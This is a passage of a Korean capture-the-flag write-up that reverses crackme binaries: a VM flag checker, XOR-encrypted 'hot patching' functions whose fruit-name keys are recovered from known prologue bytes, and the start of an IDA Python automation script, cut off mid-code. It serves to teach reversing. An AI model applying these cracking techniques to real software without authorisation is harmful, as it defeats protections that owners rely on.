<span class="k">def</span> <span class="nf">GET_FLAG_LENGTH</span><span class="p">(</span><span class="n">inp</span><span class="p">):</span>
    <span class="k">return</span> <span class="nb">len</span><span class="p">(</span><span class="n">inp</span><span class="p">)</span>

<span class="n">ENC_FLAG</span> <span class="o">=</span> <span class="p">[</span><span class="mi">123</span><span class="p">,</span> <span class="mi">120</span><span class="p">,</span> <span class="mi">140</span><span class="p">,</span> <span class="mi">153</span><span class="p">,</span> <span class="mi">192</span><span class="p">,</span> <span class="mi">37</span><span class="p">,</span> <span class="mi">165</span><span class="p">,</span> <span class="mi">150</span><span class="p">,</span> <span class="mi">203</span><span class="p">,</span> <span class="mi">23</span><span class="p">,</span> <span class="mi">199</span><span class="p">,</span> <span class="mi">222</span><span class="p">,</span> <span class="mi">164</span><span class="p">,</span> <span class="mi">129</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span> <span class="mi">229</span><span class="p">,</span> <span class="mi">59</span><span class="p">,</span> <span class="mi">56</span><span class="p">,</span> <span class="mi">195</span><span class="p">,</span> <span class="mi">97</span><span class="p">,</span> <span class="mi">207</span><span class="p">,</span> <span class="mi">108</span><span class="p">,</span> <span class="mi">50</span><span class="p">,</span> <span class="mi">51</span><span class="p">,</span> <span class="mi">153</span><span class="p">,</span> <span class="mi">248</span><span class="p">,</span> <span class="mi">39</span><span class="p">,</span> <span class="mi">72</span><span class="p">,</span> <span class="mi">122</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">93</span><span class="p">,</span> <span class="mi">44</span><span class="p">,</span> <span class="mi">113</span><span class="p">]</span>
<span class="n">KEY</span> <span class="o">=</span> <span class="p">[</span><span class="mi">170</span><span class="p">,</span> <span class="mi">68</span><span class="p">,</span> <span class="mi">138</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">142</span><span class="p">,</span> <span class="mi">162</span><span class="p">,</span> <span class="mi">151</span><span class="p">,</span> <span class="mi">226</span><span class="p">,</span> <span class="mi">51</span><span class="p">,</span> <span class="mi">148</span><span class="p">,</span> <span class="mi">151</span><span class="p">,</span> <span class="mi">94</span><span class="p">,</span> <span class="mi">14</span><span class="p">,</span> <span class="mi">185</span><span class="p">,</span> <span class="mi">161</span><span class="p">,</span> <span class="mi">33</span><span class="p">]</span>

<span class="n">INPUT_FLAG</span> <span class="o">=</span> <span class="nb">list</span><span class="p">(</span><span class="nb">input</span><span class="p">(</span><span class="s">"Check your flag: "</span><span class="p">).</span><span class="n">encode</span><span class="p">())</span>
<span class="k">if</span> <span class="n">GET_FLAG_LENGTH</span><span class="p">(</span><span class="n">INPUT_FLAG</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">33</span><span class="p">:</span>
    <span class="nb">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>

<span class="n">RESULT_FLAG</span> <span class="o">=</span> <span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">*</span> <span class="mi">33</span>

<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">33</span><span class="p">):</span>
    <span class="n">RESULT_FLAG</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="n">ROL</span><span class="p">(</span><span class="n">INPUT_FLAG</span><span class="p">[</span><span class="n">i</span><span class="p">],</span> <span class="n">i</span><span class="p">)</span>
    <span class="n">RESULT_FLAG</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">^=</span> <span class="n">KEY</span><span class="p">[</span><span class="n">i</span> <span class="o">%</span> <span class="mi">16</span><span class="p">]</span> <span class="o">+</span> <span class="n">INPUT_FLAG</span><span class="p">[(</span><span class="n">i</span> <span class="o">+</span> <span class="mi">1</span><span class="p">)</span> <span class="o">%</span> <span class="mi">33</span><span class="p">]</span>
    <span class="n">RESULT_FLAG</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">&amp;=</span> <span class="mh">0xFF</span>

<span class="k">if</span> <span class="n">RESULT_FLAG</span> <span class="o">==</span> <span class="n">ENC_FLAG</span><span class="p">:</span>
    <span class="k">print</span><span class="p">(</span><span class="s">"Correct !!"</span><span class="p">)</span>
<span class="k">else</span><span class="p">:</span>
    <span class="k">print</span><span class="p">(</span><span class="s">"Wrong .."</span><span class="p">)</span>
</code></pre></div></div>

<p>disassmble한 결과를 python으로 포팅한다.</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">def</span> <span class="nf">ROR</span><span class="p">(</span><span class="n">data</span><span class="p">,</span> <span class="n">shift</span><span class="p">):</span>
    <span class="n">shift</span> <span class="o">%=</span> <span class="mi">8</span>
    <span class="n">body</span> <span class="o">=</span> <span class="n">data</span> <span class="o">&gt;&gt;</span> <span class="n">shift</span>
    <span class="n">remains</span> <span class="o">=</span> <span class="p">(</span><span class="n">data</span> <span class="o">&lt;&lt;</span> <span class="p">(</span><span class="mi">8</span> <span class="o">-</span> <span class="n">shift</span><span class="p">))</span> <span class="o">-</span> <span class="p">(</span><span class="n">body</span> <span class="o">&lt;&lt;</span> <span class="mi">8</span><span class="p">)</span>
    <span class="k">return</span> <span class="p">(</span><span class="n">body</span> <span class="o">+</span> <span class="n">remains</span><span class="p">)</span>

<span class="n">KEY</span> <span class="o">=</span> <span class="p">[</span><span class="mi">170</span><span class="p">,</span> <span class="mi">68</span><span class="p">,</span> <span class="mi">138</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">142</span><span class="p">,</span> <span class="mi">162</span><span class="p">,</span> <span class="mi">151</span><span class="p">,</span> <span class="mi">226</span><span class="p">,</span> <span class="mi">51</span><span class="p">,</span> <span class="mi">148</span><span class="p">,</span> <span class="mi">151</span><span class="p">,</span> <span class="mi">94</span><span class="p">,</span> <span class="mi">14</span><span class="p">,</span> <span class="mi">185</span><span class="p">,</span> <span class="mi">161</span><span class="p">,</span> <span class="mi">33</span><span class="p">]</span>
<span class="n">ENC_FLAG</span> <span class="o">=</span> <span class="p">[</span><span class="mi">123</span><span class="p">,</span> <span class="mi">120</span><span class="p">,</span> <span class="mi">140</span><span class="p">,</span> <span class="mi">153</span><span class="p">,</span> <span class="mi">192</span><span class="p">,</span> <span class="mi">37</span><span class="p">,</span> <span class="mi">165</span><span class="p">,</span> <span class="mi">150</span><span class="p">,</span> <span class="mi">203</span><span class="p">,</span> <span class="mi">23</span><span class="p">,</span> <span class="mi">199</span><span class="p">,</span> <span class="mi">222</span><span class="p">,</span> <span class="mi">164</span><span class="p">,</span> <span class="mi">129</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span> <span class="mi">229</span><span class="p">,</span> <span class="mi">59</span><span class="p">,</span> <span class="mi">56</span><span class="p">,</span> <span class="mi">195</span><span class="p">,</span> <span class="mi">97</span><span class="p">,</span> <span class="mi">207</span><span class="p">,</span> <span class="mi">108</span><span class="p">,</span> <span class="mi">50</span><span class="p">,</span> <span class="mi">51</span><span class="p">,</span> <span class="mi">153</span><span class="p">,</span> <span class="mi">248</span><span class="p">,</span> <span class="mi">39</span><span class="p">,</span> <span class="mi">72</span><span class="p">,</span> <span class="mi">122</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">93</span><span class="p">,</span> <span class="mi">44</span><span class="p">,</span> <span class="mi">113</span><span class="p">]</span>

<span class="n">FLAG</span> <span class="o">=</span> <span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">*</span> <span class="mi">33</span>
<span class="n">FLAG</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="nb">ord</span><span class="p">(</span><span class="s">'b'</span><span class="p">)</span> <span class="c1"># prefix "bob{"
</span>
<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">32</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">):</span>
    <span class="n">FLAG</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="n">ROR</span><span class="p">(</span><span class="n">ENC_FLAG</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">^</span> <span class="p">(</span><span class="n">FLAG</span><span class="p">[(</span><span class="n">i</span> <span class="o">+</span> <span class="mi">1</span><span class="p">)</span> <span class="o">%</span> <span class="mi">33</span><span class="p">]</span> <span class="o">+</span> <span class="n">KEY</span><span class="p">[</span><span class="n">i</span> <span class="o">%</span> <span class="mi">16</span><span class="p">])</span> <span class="o">&amp;</span> <span class="mh">0xFF</span><span class="p">,</span> <span class="n">i</span><span class="p">)</span>

<span class="k">print</span><span class="p">(</span><span class="s">"FLAG =&gt; {}"</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="nb">bytes</span><span class="p">(</span><span class="n">FLAG</span><span class="p">)))</span>
<span class="c1"># FLAG =&gt; b'bob{BVM_Wi1l_C0m2_B@ck_N2xt_T1me}'
</span></code></pre></div></div>

<p>이것을 역연산하는 코드를 작성하면 flag를 획득할 수 있다.</p>

<p>해당 방식 이외에 비교 opcode(0x9, 0x19)에 BP를 걸고 input에 따라 변화하는 register를 보고 규칙을 찾아 flag를 간접적으로 추출하는 방법도 가능하다.</p>

<p><br></p>

<p><br></p>

<h2 id="hot-patching">
<a class="anchor" href="#hot-patching" aria-hidden="true"><span class="octicon octicon-link"></span></a>Hot Patching</h2>

<hr>

<p><img src="/assets/bob/hot_patching_1.png" alt="/assets/bob/hot_patching_1.png"></p>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Hot Patching 바이트를 통한 Key 추출
</code></pre></div></div>
<p><img src="/assets/bob/01_main.png" alt="/assets/bob/01_main.png"></p>
<center>[그림 1] main 함수(0x42D7A0) Hex-Rays 결과</center>

<ul>
  <li>main 함수(0x42D7A0)에서 sub_401000을 호출한다.</li>
</ul>

<p><img src="/assets/bob/02_401000.png" alt="/assets/bob/02_401000.png"></p>
<center>[그림 2] sub_401000 함수 Hex-Rays 결과</center>

<ul>
  <li>sub_401000은 위와 같다.</li>
</ul>

<p><img src="/assets/bob/03_42D710.png" alt="/assets/bob/03_42D710.png"></p>
<center>[그림 3] Xor을 수행하는 sub_42D710 함수</center>

<ul>
  <li>sub_42D710는 sub_401000에서 두 번 호출된다.
VirtualProtect를 통해 특정 영역의 메모리를 PAGE_EXECUTE_READWRITE(0x40)으로 변경시킨다.
그 후 세번 째 인자 값을 참조하여 Xor 연산 한다.</li>
</ul>

<p><img src="/assets/bob/04_sub_401000.png" alt="/assets/bob/04_sub_401000.png"></p>
<center>[그림 4] sub_401000 함수 동작 파악 후 네이밍 결과</center>

<ul>
  <li>sub_401000 함수 내 변수 및 함수 이름을 보기 쉽게 네이밍하였다.</li>
  <li>해당 함수의 실행 흐름은 다음과 같다.
    <ol>
      <li>scanf_s 함수를 통해 입력을 받는다.</li>
      <li>
<strong>입력 값</strong>의 글자 수를 확인하고, <strong>5글자</strong>가 아닐 시 1을 반환한다.</li>
      <li>
<strong>0x4010D0</strong> 주소에서 0x2C630(0x42D700 - 0x4010D0) 크기 만큼 <strong>입력 값</strong>과 <strong>Xor</strong> 연산 한다.</li>
      <li>
<strong>0x44A8C0</strong> 주소에서 0x20 크기 만큼 <strong>입력 값</strong>과 <strong>Xor</strong> 연산 한다.</li>
      <li>Xor 연산 후의 <strong>0x4010D0</strong> 함수를 호출한다.</li>
    </ol>
  </li>
</ul>

<p><img src="/assets/bob/05_4010D0.png" alt="/assets/bob/05_4010D0.png"></p>
<center>[그림 5] Xor 연산 전 sub_4010D0 함수</center>

<ul>
  <li>Xor 연산 전 0x4010D0 함수는 위와 같이 생겼다. 실행 가능한 어셈블리 코드로는 보이지 않는다.</li>
</ul>

<p><strong><em>“그렇다면, 입력 값이 5글자인 것 외에 단서는 무엇이 있을까?”</em></strong></p>

<ul>
  <li>0x4010D0은 다른 함수와 공통된 <a href="https://en.wikipedia.org/wiki/Function_prologue"><strong>함수 프롤로그</strong></a>를 가지고 있을 것이다.
x86 실행 바이너리는 함수 시작 시 아래와 같은 함수 프롤로그를 가지고 있다.</li>
</ul>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="mi">55</span>        <span class="n">push</span> <span class="n">ebp</span>
<span class="mi">8</span><span class="n">B</span> <span class="n">EC</span>     <span class="n">mov</span> <span class="n">ebp</span><span class="p">,</span> <span class="n">esp</span>
<span class="mi">83</span> <span class="n">EC</span> <span class="n">XX</span>  <span class="n">sub</span> <span class="n">esp</span><span class="p">,</span> <span class="n">N</span>
</code></pre></div></div>

<p><img src="/assets/bob/06_prol.png" alt="/assets/bob/06_prol.png"></p>
<center>[그림 6] 함수 초기 프롤로그</center>

<ul>
  <li>문제 바이너리에서는 함수 프롤로그 이전에 2바이트 어셈블리 <code class="highlighter-rouge">xchgax,ax</code> 가 보인다.
해당 어셈블리는 2바이트 NOP 코드 <code class="highlighter-rouge">0x66 0x90</code> 이다.
Visual Studio 컴파일 시 <a href="https://docs.microsoft.com/ko-kr/cpp/build/reference/hotpatch-create-hotpatchable-image?view=vs-2019"><strong>HotPatch 옵션</strong></a>이 활성화 된 경우 생기는 코드이다.</li>
</ul>

<p><strong><a href="https://en.wikipedia.org/wiki/Patch_(computing)#Hot_patching">Hot Patching</a>[1]</strong>이란, 서비스의 종료나 재시작 없이 패치를 적용하는 업데이트 방법이다.
x86 어셈블리 언어에서는 패치를 위해 LONG JMP 명령을 사용한다.
해당 명령은 5바이트가 필요하므로, <strong>3바이트</strong>인 <strong>함수 프롤로그</strong> 외 <strong>2바이트</strong>의 <strong>NOP 코드</strong>를
추가하여 [<strong>Hot Patching](https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2003/cc782258(v=ws.10)?redirectedfrom=MSDN)[2]</strong>에 사용한다.</p>

<p><strong><em>Windows x86 라이브러리 모듈에서는 주로</em></strong> <code class="highlighter-rouge">movedi,edi</code> <strong><em>를 사용한다.</em></strong></p>

<ul>
  <li>Hot Patching에 사용할 5바이트 <code class="highlighter-rouge">0x66 0x90 0x55 0x8B 0xEC</code> 를 통해, 입력 값을 구할 수 있다.
<strong>apple</strong> <code class="highlighter-rouge">0x61 0x70 0x70 0x6C 0x65=0x07 0xE0 0x25 0xE7 0x89**Xor**0x66 0x90 0x55 0x8B 0xEC</code>
</li>
</ul>

<p><img src="/assets/bob/07_apple.png" alt="/assets/bob/07_apple.png"></p>
<center>[그림 7] apple 입력 후 화면</center>

<ul>
  <li>apple을 입력하니 또 다시 입력을 받는다.</li>
</ul>

<p><img src="/assets/bob/08_code.png" alt="/assets/bob/08_code.png"></p>
<center>[그림 8] Xor 연산 후 0x4010D0 디스어셈블 결과</center>

<ul>
  <li>Xor 연산을 수행한 0x4010D0 부분의 코드가 정상적으로 보인다.</li>
</ul>

<p><img src="/assets/bob/09_code2.png" alt="/assets/bob/09_code2.png"></p>
<center>[그림 9] 0x4010D0 함수의 입력 값 사용</center>

<ul>
  <li>다음 입력 값의 크기는 5이며, 0x4011A0 주소와 Xor 연산하는 것으로 보인다.
연산할 크기는 0x2C560(0x42D700 - 0x4011A0)이다.</li>
  <li>
<strong>apple</strong>과 같은 방법으로 입력 값 <strong>mango</strong>를 구할 수 있다.
<strong>**apple을 입력 후 바뀐 0x4010A0 ~ 0x4010A4 범위의 값을 사용해야한다.</strong>*</li>
  <li>같은 방법으로 다음 입력 값 <strong>lemon</strong>을 구할 수 있다.</li>
</ul>

<p><img src="/assets/bob/10_code3.png" alt="/assets/bob/10_code3.png"></p>
<center>[그림 10] 0x401270 함수에서 6글자 입력 값 요구</center>

<ul>
  <li>세 번째 입력 값 lemon 이후에는 입력 값이 6으로 증가한다.</li>
  <li>그래도 알려진 5바이트를 통해 <strong>orang</strong> 5글자를 구할 수 있다.
이전에 과일이 나왔으므로 <strong>orange</strong>로 유추해 볼 수 있다.
또한  <code class="highlighter-rouge">subesp,N</code>  코드의 <code class="highlighter-rouge">0x83 0xEC 0x??</code> 를 통해서 총 최대 7글자를 구할 수 있다.</li>
</ul>

<p><img src="/assets/bob/11_flag.png" alt="/assets/bob/11_flag.png"></p>
<center>[그림 11] Flag 출력</center>

<ul>
  <li>알려진 7바이트와 유추를 통해서 Key를 총 10번 입력하면 Flag를 획득할 수 있다.</li>
</ul>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">key_info</span> <span class="o">=</span> <span class="p">[</span>
    <span class="p">{</span><span class="s">"addr"</span><span class="p">:</span><span class="mh">0x4010D0</span><span class="p">,</span> <span class="s">"size"</span><span class="p">:</span><span class="mi">5</span><span class="p">,</span> <span class="s">"data"</span><span class="p">:[</span><span class="mh">0x07</span><span class="p">,</span> <span class="mh">0xE0</span><span class="p">,</span> <span class="mh">0x25</span><span class="p">,</span> <span class="mh">0xE7</span><span class="p">,</span> <span class="mh">0x89</span><span class="p">]},</span>
    <span class="p">{</span><span class="s">"addr"</span><span class="p">:</span><span class="mh">0x4011A0</span><span class="p">,</span> <span class="s">"size"</span><span class="p">:</span><span class="mi">5</span><span class="p">,</span> <span class="s">"data"</span><span class="p">:[</span><span class="mh">0x0B</span><span class="p">,</span> <span class="mh">0xF1</span><span class="p">,</span> <span class="mh">0x3B</span><span class="p">,</span> <span class="mh">0xEC</span><span class="p">,</span> <span class="mh">0x83</span><span class="p">]},</span>
    <span class="p">{</span><span class="s">"addr"</span><span class="p">:</span><span class="mh">0x401270</span><span class="p">,</span> <span class="s">"size"</span><span class="p">:</span><span class="mi">5</span><span class="p">,</span> <span class="s">"data"</span><span class="p">:[</span><span class="mh">0x0A</span><span class="p">,</span> <span class="mh">0xF5</span><span class="p">,</span> <span class="mh">0x38</span><span class="p">,</span> <span class="mh">0xE4</span><span class="p">,</span> <span class="mh">0x82</span><span class="p">]},</span>
    <span class="p">{</span><span class="s">"addr"</span><span class="p">:</span><span class="mh">0x401350</span><span class="p">,</span> <span class="s">"size"</span><span class="p">:</span><span class="mi">6</span><span class="p">,</span> <span class="s">"data"</span><span class="p">:[</span><span class="mh">0x09</span><span class="p">,</span> <span class="mh">0xE2</span><span class="p">,</span> <span class="mh">0x34</span><span class="p">,</span> <span class="mh">0xE5</span><span class="p">,</span> <span class="mh">0x8B</span><span class="p">,</span> <span class="mh">0xE6</span><span class="p">]},</span>
    <span class="p">{</span><span class="s">"addr"</span><span class="p">:</span><span class="mh">0x401430</span><span class="p">,</span> <span class="s">"size"</span><span class="p">:</span><span class="mi">6</span><span class="p">,</span> <span class="s">"data"</span><span class="p">:[</span><span class="mh">0x04</span><span class="p">,</span> <span class="mh">0xF1</span><span class="p">,</span> <span class="mh">0x3B</span><span class="p">,</span> <span class="mh">0xEA</span><span class="p">,</span> <span class="mh">0x82</span><span class="p">,</span> <span class="mh">0xE2</span><span class="p">]},</span>
    <span class="p">{</span><span class="s">"addr"</span><span class="p">:</span><span class="mh">0x401510</span><span class="p">,</span> <span class="s">"size"</span><span class="p">:</span><span class="mi">6</span><span class="p">,</span> <span class="s">"data"</span><span class="p">:[</span><span class="mh">0x02</span><span class="p">,</span> <span class="mh">0xE5</span><span class="p">,</span> <span class="mh">0x27</span><span class="p">,</span> <span class="mh">0xE2</span><span class="p">,</span> <span class="mh">0x8D</span><span class="p">,</span> <span class="mh">0xED</span><span class="p">]},</span>
    <span class="p">{</span><span class="s">"addr"</span><span class="p">:</span><span class="mh">0x4015F0</span><span class="p">,</span> <span class="s">"size"</span><span class="p">:</span><span class="mi">7</span><span class="p">,</span> <span class="s">"data"</span><span class="p">:[</span><span class="mh">0x05</span><span class="p">,</span> <span class="mh">0xE5</span><span class="p">,</span> <span class="mh">0x27</span><span class="p">,</span> <span class="mh">0xF9</span><span class="p">,</span> <span class="mh">0x8D</span><span class="p">,</span> <span class="mh">0xED</span><span class="p">,</span> <span class="mh">0x98</span><span class="p">]},</span>
    <span class="p">{</span><span class="s">"addr"</span><span class="p">:</span><span class="mh">0x4016D0</span><span class="p">,</span> <span class="s">"size"</span><span class="p">:</span><span class="mi">7</span><span class="p">,</span> <span class="s">"data"</span><span class="p">:[</span><span class="mh">0x07</span><span class="p">,</span> <span class="mh">0xE6</span><span class="p">,</span> <span class="mh">0x3A</span><span class="p">,</span> <span class="mh">0xE8</span><span class="p">,</span> <span class="mh">0x8D</span><span class="p">,</span> <span class="mh">0xE7</span><span class="p">,</span> <span class="mh">0x83</span><span class="p">]},</span>
    <span class="p">{</span><span class="s">"addr"</span><span class="p">:</span><span class="mh">0x4017B0</span><span class="p">,</span> <span class="s">"size"</span><span class="p">:</span><span class="mi">7</span><span class="p">,</span> <span class="s">"data"</span><span class="p">:[</span><span class="mh">0x05</span><span class="p">,</span> <span class="mh">0xFF</span><span class="p">,</span> <span class="mh">0x36</span><span class="p">,</span> <span class="mh">0xE4</span><span class="p">,</span> <span class="mh">0x82</span><span class="p">,</span> <span class="mh">0xF6</span><span class="p">,</span> <span class="mh">0x98</span><span class="p">]},</span>
    <span class="p">{</span><span class="s">"addr"</span><span class="p">:</span><span class="mh">0x401890</span><span class="p">,</span> <span class="s">"size"</span><span class="p">:</span><span class="mi">8</span><span class="p">,</span> <span class="s">"data"</span><span class="p">:[</span><span class="mh">0x0B</span><span class="p">,</span> <span class="mh">0xF1</span><span class="p">,</span> <span class="mh">0x3B</span><span class="p">,</span> <span class="mh">0xEF</span><span class="p">,</span> <span class="mh">0x8D</span><span class="p">,</span> <span class="mh">0xF1</span><span class="p">,</span> <span class="mh">0x85</span><span class="p">,</span> <span class="mh">0x4E</span><span class="p">]}</span>
<span class="p">]</span>

<span class="n">known_bytes</span> <span class="o">=</span> <span class="p">[</span><span class="mh">0x66</span><span class="p">,</span> <span class="mh">0x90</span><span class="p">,</span> <span class="mh">0x55</span><span class="p">,</span> <span class="mh">0x8B</span><span class="p">,</span> <span class="mh">0xEC</span><span class="p">,</span> <span class="mh">0x83</span><span class="p">,</span> <span class="mh">0xEC</span><span class="p">]</span>
<span class="k">for</span> <span class="n">k</span> <span class="ow">in</span> <span class="n">key_info</span><span class="p">:</span>
    <span class="n">data</span> <span class="o">=</span> <span class="n">k</span><span class="p">[</span><span class="s">"data"</span><span class="p">]</span>
    <span class="n">key</span> <span class="o">=</span> <span class="s">""</span>
    <span class="n">size</span> <span class="o">=</span> <span class="nb">len</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">size</span><span class="p">):</span>
        <span class="n">key</span> <span class="o">+=</span> <span class="nb">chr</span><span class="p">(</span><span class="n">data</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">^</span> <span class="n">known_bytes</span><span class="p">[</span><span class="n">i</span> <span class="o">%</span> <span class="mi">7</span><span class="p">])</span>

    <span class="k">print</span><span class="p">(</span><span class="n">key</span><span class="p">[:</span><span class="mi">5</span><span class="p">]</span> <span class="o">+</span> <span class="s">"?"</span> <span class="o">*</span> <span class="p">(</span><span class="n">size</span> <span class="o">-</span> <span class="mi">5</span><span class="p">),</span> <span class="s">"=&gt;"</span><span class="p">,</span> <span class="n">key</span><span class="p">)</span> <span class="c1">#Known Bytes Size == 5, 7
</span>
<span class="s">""" #Result
apple =&gt; apple
mango =&gt; mango
lemon =&gt; lemon
orang? =&gt; orange
banan? =&gt; banana
duria? =&gt; durian
curra?? =&gt; currant
avoca?? =&gt; avocado
cocon?? =&gt; coconut
manda??? =&gt; mandari? =&gt; mandarin*
"""</span>
</code></pre></div></div>

<p><br></p>

<p><br></p>

<h2 id="hot-patching-777">
<a class="anchor" href="#hot-patching-777" aria-hidden="true"><span class="octicon octicon-link"></span></a>Hot Patching 777</h2>

<hr>

<p><img src="/assets/bob/hot_patching_2.png" alt="/assets/bob/hot_patching_2.png"></p>

<p>공통된 명령 바이트를 통한 Key 추출 자동화</p>

<ul>
  <li>이전 <strong>Hot Patching</strong> 문제는 별도의 자동화 없이 문제를 해결할 수 있었다.</li>
</ul>

<p><img src="/assets/bob/12_flag_xor.png" alt="/assets/bob/12_flag_xor.png"></p>
<center>[그림 1] 0x401890 함수에서 Flag 출력 후 연산 데이터</center>

<ul>
  <li>0x401890 함수에서 첫 번째 Flag를 출력해주고, 다음 Flag를 위한 연산이 수행된다.</li>
</ul>

<p><img src="/assets/bob/13_11th_function.png" alt="/assets/bob/13_11th_function.png"></p>
<center>[그림 2] 0x401890 함수에서 별도 입력 처리 없이 다음 함수 복호화 수행</center>

<ul>
  <li>10 번째 Key까지 모두 올바르게 입력된 경우, 다음 함수는 별도 입력 처리 없이 복호화 된다.</li>
</ul>

<p><img src="/assets/bob/14_length.png" alt="/assets/bob/14_length.png"></p>
<center>[그림 3] 0x4019B0 함수에서 입력 값 검사</center>

<ul>
  <li>첫 번째 Flag 출력 이전까지는 5~8 글자의 입력 값이 필요했지만, 11 번째는 17 글자를 요구한다.</li>
  <li>
    <p>알려진 7바이트를 통해, 일부를 복구하여도 이전과 다르게 특정 단어로 추정할 수 없다.
<strong>TO5yQyc</strong> <code class="highlighter-rouge">0x54 0x4F 0x35 0x79 0x51 0x79 0x63</code>
          <code class="highlighter-rouge">=0x32 0xDF 0x60 0xF2 0xBD 0xFA 0x8F**Xor**0x66 0x90 0x55 0x8B 0xEC 0x83 0xEC</code>
                               <strong><em>“그렇다면, 알려진 7바이트 외에 단서가 필요하다.”</em></strong></p>
  </li>
  <li>지금까지 Flag 출력 함수 외 모든 함수는 같은 형식으로 구성되어있다.
다른 점은 입력 값의 크기, 복호화 대상 주소, 다음 함수 주소 등이다.</li>
</ul>

<p><img src="/assets/bob/15_dummy.png" alt="/assets/bob/15_dummy.png"></p>
<center>[그림 4] 함수 중간 중간 존재하는 더미코드</center>

<ul>
  <li>함수의 내용은 모두 같지만, 중간 중간 더미코드가 혼란을 주고 있다.
더미코드의 영향을 받지 않으면서 공통된 어셈블리 코드를 찾아야한다.</li>
</ul>

<p><img src="/assets/bob/16_common.png" alt="/assets/bob/16_common.png"></p>
<center>[그림 5] 공통된 strlen 기능 코드</center>

<ul>
  <li>strlen 기능의 코드 덕분에 무려 58바이트의 공통 코드를 찾을 수 있다.
<strong>**마지막 cmp 명령의 글자수(0x07) 비교 전 까지 58 바이트</strong>*</li>
</ul>

<p><img src="/assets/bob/17_scan.png" alt="/assets/bob/17_scan.png"></p>
<center>[그림 6] 공통 코드 메모리 검색 결과</center>

<ul>
  <li>현재 Flag 출력 외 11개 함수가 복호화되어있다. 공통 코드를 검색한 결과 또한 11개다.
이를 활용하여 입력 값 추출 자동화를 수행할 수 있다.</li>
  <li>아래와 같은 내용을 토대로 자동화 코드를 작성하였다.
    <ol>
      <li>디스어셈블러를 통해, cmp 명령어에서 비교할 입력 값을 구한다.</li>
      <li>이후 sub 명령어에서 Xor 연산 시작 주소를 구한다.</li>
      <li>알려진 5바이트를 통해, 입력 값의 첫 5글자를 획득한다.</li>
      <li>첫 5글자를 패치 대상 데이터와 Xor 연산하고, 공통 코드 58바이트에 포함되는지 확인한다.</li>
      <li>포함될 경우 입력 값을 추출할 수 있다.</li>
      <li>디스어셈블러, 코드 패치 기능을 수행할 수 있는 IDA Python을 사용하여 작성한다.</li>
    </ol>
  </li>
</ul>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="nn">struct</span>
<span class="n">p32</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">x</span><span class="p">:</span><span class="n">struct</span><span class="p">.</span><span class="n">pack</span><span class="p">(</span><span class="s">"&lt;L"</span><span class="p">,</span> <span class="n">x</span><span class="p">)</span>

<span class="c1"># patch_xor : Xor 연산을 통해 패치를 수행하는 함수
</span><span class="k">def</span> <span class="nf">patch_xor</span><span class="p">(</span><span class="n">addr_patch</span><span class="p">,</span> <span class="n">addr_end</span><span class="p">,</span> <span class="n">xor_key</span><span class="p">):</span>
    <span class="n">size_patch</span> <span class="o">=</span> <span class="n">addr_end</span> <span class="o">-</span> <span class="n">addr_patch</span>
    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">size_patch</span><span class="p">):</span>
        <span class="n">cur</span> <span class="o">=</span> <span class="n">addr_patch</span> <span class="o">+</span> <span class="n">i</span>
        <span class="n">idc</span><span class="p">.</span><span class="n">PatchByte</span><span class="p">(</span><span class="n">cur</span><span class="p">,</span> <span class="n">idc</span><span class="p">.</span><span class="n">Byte</span><span class="p">(</span><span class="n">cur</span><span class="p">)</span> <span class="o">^</span> <span class="n">xor_key</span><span class="p">[</span><span class="n">i</span> <span class="o">%</span> <span class="nb">len</span><span class="p">(</span><span class="n">xor_key</span><span class="p">)])</span>
        <span class="c1"># Xor 연산한 데이터를 패치하여 반영
</span>        <span class="n">idc</span><span class="p">.</span><span class="n">MakeUnknown</span><span class="p">(</span><span class="n">cur</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="n">idc</span><span class="p">.</span><span class="n">DOUNK_SIMPLE</span><span class="p">)</span>
        <span class="c1"># 패치 후 Unknown 형태로 변환하여 잘못된 디스어셈블리 방지
</span>    <span class="k">return</span>

<span class="c1"># xor_data : 단순 Xor 함수
</span><span class="k">def</span> <span class="nf">xor_data</span><span class="p">(</span><span class="n">addr_xor</span><span class="p">,</span> <span class="n">addr_end</span><span class="p">,</span> <span class="n">xor_key</span><span class="p">):</span>
    <span class="n">result</span> <span class="o">=</span> <span class="p">[]</span>
    <span class="n">size_xor</span> <span class="o">=</span> <span class="n">addr_end</span> <span class="o">-</span> <span class="n">addr_xor</span>
